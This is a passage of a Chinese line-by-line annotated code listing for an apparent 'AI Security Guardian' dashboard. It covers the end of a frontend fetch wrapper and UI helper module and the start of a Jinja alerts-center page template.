| 97 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (token) finalHeaders["Authorization"] = "Bearer " + token;` |
| 98 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 99 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 100 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let resp;` |
| 101 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 102 | 接口请求：向后端 API 读取或提交数据。 | `      resp = await fetch(url, {` |
| 103 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method,` |
| 104 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        headers: finalHeaders,` |
| 105 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: body` |
| 106 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          ? body instanceof FormData` |
| 107 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            ? body` |
| 108 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            : JSON.stringify(body)` |
| 109 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          : undefined,` |
| 110 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        credentials: "same-origin",` |
| 111 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 112 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (networkErr) {` |
| 113 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      throw new Error("网络异常：" + networkErr.message);` |
| 114 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 115 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 116 | 注释：说明前端逻辑或交互意图。 | `    // 401：尝试刷新令牌一次，失败则跳登录` |
| 117 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (resp.status === 401 && !skipAuth && !options._retry) {` |
| 118 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const refreshed = await tryRefresh();` |
| 119 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (refreshed) {` |
| 120 | 返回结果：把计算值交给调用方。 | `        return fetchApi(path, { ...options, _retry: true });` |
| 121 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 122 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      gotoLogin("登录状态已失效，请重新登录");` |
| 123 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      throw new Error("未授权");` |
| 124 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 125 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 126 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (resp.status === 403) {` |
| 127 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("没有权限访问此资源", "error");` |
| 128 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      throw new Error("Forbidden");` |
| 129 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 130 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 131 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (resp.status === 429) {` |
| 132 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("操作过于频繁，请稍后再试", "warning");` |
| 133 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      throw new Error("Rate limited");` |
| 134 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 135 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 136 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const contentType = resp.headers.get("content-type") \|\| "";` |
| 137 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const isJson = contentType.includes("application/json");` |
| 138 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const payload = isJson ? await resp.json().catch(() => ({})) : await resp.text();` |
| 139 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 140 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!resp.ok) {` |
| 141 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const msg =` |
| 142 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        (isJson && payload && payload.error) \|\|` |
| 143 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        (typeof payload === "string" ? payload : "") \|\|` |
| 144 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "请求失败";` |
| 145 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const err = new Error(msg);` |
| 146 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      err.status = resp.status;` |
| 147 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      err.payload = payload;` |
| 148 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      throw err;` |
| 149 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 150 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 151 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (returnResponse) {` |
| 152 | 返回结果：把计算值交给调用方。 | `      return { data: payload, status: resp.status, headers: resp.headers };` |
| 153 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 154 | 返回结果：把计算值交给调用方。 | `    return payload;` |
| 155 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 156 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 157 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function tryRefresh() {` |
| 158 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const refresh = getRefreshToken();` |
| 159 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!refresh) return false;` |
| 160 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 161 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const resp = await fetch("/api/auth/refresh", {` |
| 162 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 163 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        headers: {` |
| 164 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          Accept: "application/json",` |
| 165 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          Authorization: "Bearer " + refresh,` |
| 166 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 167 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 168 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!resp.ok) return false;` |
| 169 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const data = await resp.json();` |
| 170 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (data.access_token) {` |
| 171 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        localStorage.setItem(TOKEN_KEY, data.access_token);` |
| 172 | 返回结果：把计算值交给调用方。 | `        return true;` |
| 173 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 174 | 返回结果：把计算值交给调用方。 | `      return false;` |
| 175 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {` |
| 176 | 返回结果：把计算值交给调用方。 | `      return false;` |
| 177 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 178 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 179 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 180 | 注释：说明前端逻辑或交互意图。 | `  /* ------------------------- UI 工具 --------------------------- */` |
| 181 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 182 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function ensureToastContainer() {` |
| 183 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let el = document.getElementById("ag-toast-container");` |
| 184 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!el) {` |
| 185 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el = document.createElement("div");` |
| 186 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.id = "ag-toast-container";` |
| 187 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.className = "toast-container";` |
| 188 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      document.body.appendChild(el);` |
| 189 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 190 | 返回结果：把计算值交给调用方。 | `    return el;` |
| 191 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 192 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 193 | 注释：说明前端逻辑或交互意图。 | `  /**` |
| 194 | 注释：说明前端逻辑或交互意图。 | `   * @param {string} message` |
| 195 | 注释：说明前端逻辑或交互意图。 | `   * @param {"info"\|"error"\|"warning"} type` |
| 196 | 注释：说明前端逻辑或交互意图。 | `   * @param {number} duration` |
| 197 | 注释：说明前端逻辑或交互意图。 | `   */` |
| 198 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function toast(message, type = "info", duration = 3200) {` |
| 199 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const container = ensureToastContainer();` |
| 200 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const el = document.createElement("div");` |
| 201 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.className = "toast" + (type === "error"` |
| 202 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ? " toast--error"` |
| 203 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      : type === "warning"` |
| 204 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ? " toast--warning"` |
| 205 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      : "");` |
| 206 | 页面更新：修改元素内容、样式或状态。 | `    el.textContent = message;` |
| 207 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    container.appendChild(el);` |
| 208 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    setTimeout(() => {` |
| 209 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.style.opacity = "0";` |
| 210 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.style.transition = "opacity 0.2s ease";` |
| 211 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      setTimeout(() => el.remove(), 220);` |
| 212 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }, duration);` |
| 213 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 214 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 215 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function escapeHtml(value) {` |
| 216 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (value === null \|\| value === undefined) return "";` |
| 217 | 返回结果：把计算值交给调用方。 | `    return String(value)` |
| 218 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .replaceAll("&", "&amp;")` |
| 219 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .replaceAll("<", "&lt;")` |
| 220 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .replaceAll(">", "&gt;")` |
| 221 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .replaceAll('"', "&quot;")` |
| 222 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .replaceAll("'", "&#39;");` |
| 223 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 224 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 225 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function formatTime(iso) {` |
| 226 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!iso) return "";` |
| 227 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const d = new Date(iso);` |
| 228 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (Number.isNaN(d.getTime())) return iso;` |
| 229 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const pad = (n) => String(n).padStart(2, "0");` |
| 230 | 返回结果：把计算值交给调用方。 | `    return (` |
| 231 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      d.getFullYear() +` |
| 232 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "-" +` |
| 233 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getMonth() + 1) +` |
| 234 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "-" +` |
| 235 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getDate()) +` |
| 236 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      " " +` |
| 237 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getHours()) +` |
| 238 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ":" +` |
| 239 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getMinutes()) +` |
| 240 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ":" +` |
| 241 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pad(d.getSeconds())` |
| 242 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 243 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 244 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 245 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function levelBadge(level) {` |
| 246 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const safe = ["low", "medium", "high", "critical"].includes(level)` |
| 247 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ? level` |
| 248 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      : "low";` |
| 249 | 返回结果：把计算值交给调用方。 | `    return (` |
| 250 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="badge badge--' +` |
| 251 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      safe +` |
| 252 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 253 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      safe.toUpperCase() +` |
| 254 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>"` |
| 255 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 256 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 257 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 258 | 注释：说明前端逻辑或交互意图。 | `  /* ------------------------- 登录守卫 --------------------------- */` |
| 259 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 260 | 注释：说明前端逻辑或交互意图。 | `  /**` |
| 261 | 注释：说明前端逻辑或交互意图。 | `   * 在受保护页面加载时调用。若无 token，立即跳登录。` |
| 262 | 注释：说明前端逻辑或交互意图。 | `   * 返回 true 表示已认证，可以继续初始化业务。` |
| 263 | 注释：说明前端逻辑或交互意图。 | `   */` |
| 264 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function requireAuth() {` |
| 265 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!getToken()) {` |
| 266 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      gotoLogin();` |
| 267 | 返回结果：把计算值交给调用方。 | `      return false;` |
| 268 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 269 | 返回结果：把计算值交给调用方。 | `    return true;` |
| 270 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 271 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 272 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function logout() {` |
| 273 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    clearTokens();` |
| 274 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    location.href = "/login";` |
| 275 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 276 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 277 | 注释：说明前端逻辑或交互意图。 | `  /* ------------------------- 导出 ------------------------------- */` |
| 278 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  window.AGApi = {` |
| 279 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    fetchApi,` |
| 280 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    getToken,` |
| 281 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    getRefreshToken,` |
| 282 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setTokens,` |
| 283 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    clearTokens,` |
| 284 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    getUsername,` |
| 285 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    requireAuth,` |
| 286 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    logout,` |
| 287 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    gotoLogin,` |
| 288 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 289 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 290 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  window.AGUI = {` |
| 291 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    toast,` |
| 292 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    escapeHtml,` |
| 293 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    formatTime,` |
| 294 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    levelBadge,` |
| 295 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 296 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/templates/alerts.html`

- 类型：前端页面模板
- 行数：204

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% extends "base.html" %}` |
| 2 | 空行：分隔模板结构。 | `&nbsp;` |
| 3 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{#-` |
| 4 | 文本内容：作为页面可见文案或模板数据。 | `  告警中心（Alerts） — DESIGN.md §8.2` |
| 5 | 空行：分隔模板结构。 | `&nbsp;` |
| 6 | 文本内容：作为页面可见文案或模板数据。 | `  布局契约：` |
| 7 | 文本内容：作为页面可见文案或模板数据。 | `    - 筛选栏：威胁等级（4 色按钮组）、时间范围、攻击类型、状态、搜索` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `    - 列表：左侧 3px 等级色条 + 告警标题 + 来源 IP（等宽蓝）+ 时间（等宽）+ 等级徽章 + 操作` |
| 9 | 文本内容：作为页面可见文案或模板数据。 | `    - 严重等级徽章脉冲辉光；新告警入场滑入动画` |
| 10 | 文本内容：作为页面可见文案或模板数据。 | `    - 详情抽屉：元信息 + AI 推理 + 原始数据 + 操作（封禁/确认/处理/忽略）` |
| 11 | 空行：分隔模板结构。 | `&nbsp;` |
| 12 | 文本内容：作为页面可见文案或模板数据。 | `  数据契约（/api/alerts 与 /api/alerts/<id> 字段一致，详情返回完整 history/raw/features）：` |
| 13 | 文本内容：作为页面可见文案或模板数据。 | `    id, timestamp, level, status, threat_type, title, summary,` |
| 14 | 文本内容：作为页面可见文案或模板数据。 | `    source_ip, source_port, dest_ip, dest_port, protocol,` |
| 15 | 文本内容：作为页面可见文案或模板数据。 | `    confidence, model_version, recommended_action,` |
| 16 | 文本内容：作为页面可见文案或模板数据。 | `    features (dict), explanation (str), raw (str), indicators (list), history (list)` |
| 17 | 文本内容：作为页面可见文案或模板数据。 | `-#}` |
| 18 | 空行：分隔模板结构。 | `&nbsp;` |
| 19 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block title %}告警中心 · AI Security Guardian{% endblock %}` |
| 20 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_title %}告警中心{% endblock %}` |
| 21 | 空行：分隔模板结构。 | `&nbsp;` |
| 22 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_actions %}` |
| 23 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--ghost btn--sm" id="btn-seed" type="button" hidden>生成演示数据</button>` |
| 24 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--ghost btn--sm" id="btn-refresh" type="button" title="手动刷新 (R)">刷新</button>` |
| 25 | HTML 结构：定义 `label` 元素及其属性或内容。 | `  <label class="btn btn--ghost btn--sm" style="gap: 6px">` |
| 26 | 输入控件：收集用户填写或选择的数据。 | `    <input type="checkbox" id="toggle-autorefresh" style="margin: 0" />` |
| 27 | HTML 结构：定义 `span` 元素及其属性或内容。 | `    <span>自动 15s</span>` |
| 28 | 标签闭合：结束当前 HTML 元素。 | `  </label>` |
| 29 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 30 | 空行：分隔模板结构。 | `&nbsp;` |
| 31 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block content %}` |
| 32 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="page-header" aria-label="告警统计">` |
| 33 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="page-header__meta" role="status" aria-live="polite">` |
| 34 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>当前筛选 <strong id="count-filtered">0</strong></span>` |
| 35 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>全部告警 <strong id="count-total">0</strong></span>` |
| 36 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>未处理 <strong id="count-open">0</strong></span>` |
| 37 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 38 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div id="active-chips" class="page-header__meta" aria-label="活动筛选条件"></div>` |
| 39 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 40 | 空行：分隔模板结构。 | `&nbsp;` |
| 41 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="filter-bar" aria-label="告警筛选">` |
| 42 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 43 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="filter-bar__label">威胁等级</span>` |
| 44 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="btn-group" role="group" aria-label="按等级筛选">` |
| 45 | 按钮控件：提供可点击操作入口。 | `        <button class="btn is-active" type="button" data-level="">全部</button>` |
| 46 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--level-low" type="button" data-level="low">低危</button>` |
| 47 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--level-medium" type="button" data-level="medium">中危</button>` |
| 48 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--level-high" type="button" data-level="high">高危</button>` |
| 49 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--level-critical" type="button" data-level="critical">严重</button>` |
| 50 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 51 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 52 | 空行：分隔模板结构。 | `&nbsp;` |
| 53 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 54 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-status">状态</label>` |
| 55 | 输入控件：收集用户填写或选择的数据。 | `      <select id="filter-status" class="form-select">` |
| 56 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="">全部</option>` |
| 57 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="open">未处理</option>` |
| 58 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="acknowledged">已确认</option>` |
| 59 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="resolved">已处理</option>` |
| 60 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="ignored">已忽略</option>` |
| 61 | 标签闭合：结束当前 HTML 元素。 | `      </select>` |
| 62 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 63 | 空行：分隔模板结构。 | `&nbsp;` |
| 64 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 65 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-range">时间范围</label>` |
| 66 | 输入控件：收集用户填写或选择的数据。 | `      <select id="filter-range" class="form-select">` |
| 67 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="1h">近 1 小时</option>` |
| 68 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="24h" selected>近 24 小时</option>` |
| 69 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="7d">近 7 天</option>` |
| 70 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="30d">近 30 天</option>` |
| 71 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="all">全部</option>` |
| 72 | 标签闭合：结束当前 HTML 元素。 | `      </select>` |
| 73 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 74 | 空行：分隔模板结构。 | `&nbsp;` |
| 75 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 76 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-type">攻击类型</label>` |
| 77 | 输入控件：收集用户填写或选择的数据。 | `      <select id="filter-type" class="form-select">` |
| 78 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="">全部类型</option>` |
| 79 | 标签闭合：结束当前 HTML 元素。 | `      </select>` |
| 80 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 81 | 空行：分隔模板结构。 | `&nbsp;` |
| 82 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group filter-bar__search">` |
| 83 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-query">搜索</label>` |
| 84 | 输入控件：收集用户填写或选择的数据。 | `      <input` |
| 85 | 文本内容：作为页面可见文案或模板数据。 | `        id="filter-query"` |
| 86 | 文本内容：作为页面可见文案或模板数据。 | `        class="form-input form-input--mono"` |
| 87 | 文本内容：作为页面可见文案或模板数据。 | `        type="search"` |
| 88 | 文本内容：作为页面可见文案或模板数据。 | `        placeholder="标题 / IP / 类型…"` |
| 89 | 文本内容：作为页面可见文案或模板数据。 | `        autocomplete="off"` |
| 90 | 文本内容：作为页面可见文案或模板数据。 | `      />` |
| 91 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 92 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 93 | 空行：分隔模板结构。 | `&nbsp;` |
| 94 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="card" aria-label="告警列表">` |
| 95 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__header">` |
| 96 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `      <h3 class="card__title">告警列表</h3>` |
| 97 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="topbar__actions" style="gap: var(--space-xs)">` |
| 98 | 按钮控件：提供可点击操作入口。 | `        <button class="btn btn--ghost btn--sm" id="btn-load-more" type="button" hidden>加载更多</button>` |
| 99 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span id="list-status" class="text-tertiary" style="font-size: var(--fs-caption)"></span>` |
| 100 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 101 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 102 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__body">` |
| 103 | HTML 结构：定义 `ul` 元素及其属性或内容。 | `      <ul id="alert-list" class="alert-list" role="list">` |
| 104 | HTML 结构：定义 `li` 元素及其属性或内容。 | `        <li class="alert-list__empty">` |
| 105 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span class="loader" aria-hidden="true"></span>` |
| 106 | HTML 结构：定义 `span` 元素及其属性或内容。 | `          <span style="margin-left: 8px">加载中…</span>` |
| 107 | 标签闭合：结束当前 HTML 元素。 | `        </li>` |
| 108 | 标签闭合：结束当前 HTML 元素。 | `      </ul>` |
| 109 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 110 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 111 | 空行：分隔模板结构。 | `&nbsp;` |
| 112 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- 详情抽屉（默认隐藏；由 alerts.js 切换 .is-open） -#}` |
| 113 | HTML 结构：定义 `div` 元素及其属性或内容。 | `  <div id="drawer-overlay" class="drawer-overlay" aria-hidden="true"></div>` |
| 114 | HTML 结构：定义 `aside` 元素及其属性或内容。 | `  <aside` |
| 115 | 文本内容：作为页面可见文案或模板数据。 | `    id="alert-drawer"` |
| 116 | 文本内容：作为页面可见文案或模板数据。 | `    class="drawer"` |
| 117 | 文本内容：作为页面可见文案或模板数据。 | `    role="dialog"` |
| 118 | 文本内容：作为页面可见文案或模板数据。 | `    aria-modal="true"` |
| 119 | 文本内容：作为页面可见文案或模板数据。 | `    aria-labelledby="drawer-title"` |
| 120 | 文本内容：作为页面可见文案或模板数据。 | `    aria-hidden="true"` |
| 121 | 文本内容：作为页面可见文案或模板数据。 | `  >` |
| 122 | HTML 结构：定义 `header` 元素及其属性或内容。 | `    <header class="drawer__header">` |
| 123 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="drawer__title" id="drawer-title">` |
| 124 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span id="drawer-title-text" class="drawer__title-text">告警详情</span>` |
| 125 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span id="drawer-level-badge"></span>` |
| 126 | 标签闭合：结束当前 HTML 元素。 | `      </h2>` |
| 127 | 按钮控件：提供可点击操作入口。 | `      <button class="drawer__close" id="drawer-close" type="button" aria-label="关闭">×</button>` |
| 128 | 标签闭合：结束当前 HTML 元素。 | `    </header>` |
| 129 | 空行：分隔模板结构。 | `&nbsp;` |
| 130 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="drawer__body">` |
| 131 | HTML 结构：定义 `section` 元素及其属性或内容。 | `      <section class="drawer__section">` |
| 132 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="drawer__section-title">基本信息</h3>` |
